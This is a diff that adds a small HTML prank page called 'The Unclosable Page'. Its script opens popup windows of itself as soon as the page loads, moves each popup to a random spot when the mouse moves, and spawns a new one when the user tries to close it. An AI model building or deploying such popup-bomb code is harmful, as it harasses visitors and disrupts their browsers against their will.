@@ -1,0 +1,23 @@
+<!doctype html>
+<html>
+  <head>
+    <title>The Unclosable Page</title>
+  </head>
+  <body>
+    <h1 style="font-family: sans-serif;">Cool, huh?</h1>
+    <script>
+      if (window.opener == null) {
+        window.open("https://ktibow.github.io/unclosable/", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=5, height=5, titlebar=no, alwaysRaised=yes');
+        window.open("https://ktibow.github.io/unclosable/", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=5, height=5, titlebar=no, alwaysRaised=yes');
+        window.open("https://ktibow.github.io/unclosable/", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=5, height=5, titlebar=no, alwaysRaised=yes');
+      } else {
+        function dislocate() {moveTo(Math.random()*screen.width, Math.random()*screen.height)}
+        window.onmousemove = dislocate;
+        function closingCode(){
+           setTimeout(window.open, 1, "https://ktibow.github.io/unclosable/", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=5, height=5, titlebar=no, alwaysRaised=yes, fullscreen=1');
+        }
+        window.onbeforeunload = closingCode;
+      }
+    </script>
+  </body>
+</html>
